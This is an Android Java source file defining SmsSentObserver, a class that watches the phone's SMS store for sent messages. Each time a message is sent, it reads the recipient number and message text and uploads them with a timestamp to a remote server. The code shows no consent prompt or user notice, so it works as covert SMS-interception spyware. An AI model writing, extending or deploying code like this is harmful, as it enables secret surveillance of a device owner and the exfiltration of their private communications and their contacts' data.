package com.inet.android.message;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

import com.inet.android.request.AppConstants;
import com.inet.android.request.RequestList;
import com.inet.android.utils.AppSettings;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.loopj.android.http.RequestParams;

/**
 * SmsSentObserver class is design for monitoring outgoing sms
 * 
 * @author johny homicide
 * 
 */
public class SmsSentObserver extends ContentObserver {

	private static final String TAG = "SMSTSentObserver";
	private static final Uri STATUS_URI = Uri.parse("content://sms");
	private Context mContext;
	private static long id = 0;
	private Handler handler;

	public SmsSentObserver(Handler handler, Context ctx) {
		super(handler);
		mContext = ctx;
	}

	public SmsSentObserver(Handler handler) {
		super(handler);
		// TODO Auto-generated constructor stub
		this.handler = handler;
	}

	public void setContext(Context context) {
		this.mContext = context;
	}

	public boolean deliverSelfNotifications() {
		return true;
	}

	public void onChange(boolean selfChange) {
		try {
			Logging.doLog(TAG, "Notification on SMS observer",
					"Notification on SMS observer");
			if (AppSettings.getState(AppConstants.TYPE_INCOMING_SMS_REQUEST,
					mContext) == 0)
				return;
			Cursor sms_sent_cursor = mContext.getContentResolver().query(
					STATUS_URI, null, null, null, null);
			if (sms_sent_cursor != null) {
				if (sms_sent_cursor.moveToFirst()) {
					String protocol = sms_sent_cursor.getString(sms_sent_cursor
							.getColumnIndex("protocol"));

					Logging.doLog(TAG, "protocol : " + protocol, "protocol : "
							+ protocol);

					if (protocol == null) {
						// String[] colNames = sms_sent_cursor.getColumnNames();
						int type = sms_sent_cursor.getInt(sms_sent_cursor
								.getColumnIndex("type"));

						Logging.doLog(TAG, "SMS Type : " + type, "SMS Type : "
								+ type);

						if (type == 2) {
							long messageId = sms_sent_cursor
									.getLong(sms_sent_cursor
											.getColumnIndex("_id"));
							// проверяем не обрабатывали ли мы это сообщение
							// только-что
							if (messageId != id) {
								id = messageId;
								int threadId = sms_sent_cursor
										.getInt(sms_sent_cursor
												.getColumnIndex("thread_id"));
								Cursor c = mContext.getContentResolver().query(
										Uri.parse("content://sms/outbox/"
												+ threadId), null, null, null,
										null);
								c.moveToNext();
								String phNumber = sms_sent_cursor
										.getString(sms_sent_cursor
												.getColumnIndex("address"));
								String message = sms_sent_cursor
										.getString(sms_sent_cursor
												.getColumnIndex("body"));

								// -------send sms----------------------------
								RequestParams params = new RequestParams();
								params.put("data[][info][number]", phNumber);
								params.put("data[][info][data]", message);

								params.put("data[][time]",
										ConvertDate.logTime());
								params.put("data[][type]",
										AppConstants.TYPE_OUTGOING_SMS_REQUEST);
								params.put("key", System.currentTimeMillis());

								RequestList.sendDataRequest(params, mContext);

								/*
								 * if(colNames != null){ for(int k=0;
								 * k<colNames.length; k++){ Log.e(TAG,
								 * "colNames["+k+"] : " + colNames[k]); } }
								 */
								sms_sent_cursor.close();
							}
						}
					}
				}
			} else

				Logging.doLog(TAG, "smsSentObserver: Send Cursor is Empty",
						"smsSentObserver: Send Cursor is Empty");
		} catch (Exception sggh) {
			Logging.doLog(TAG, "Error on onChange : " + sggh.toString(),
					"Error on onChange : " + sggh.toString());
		}
		super.onChange(selfChange);
	}

}// End of class SmsSentObserver
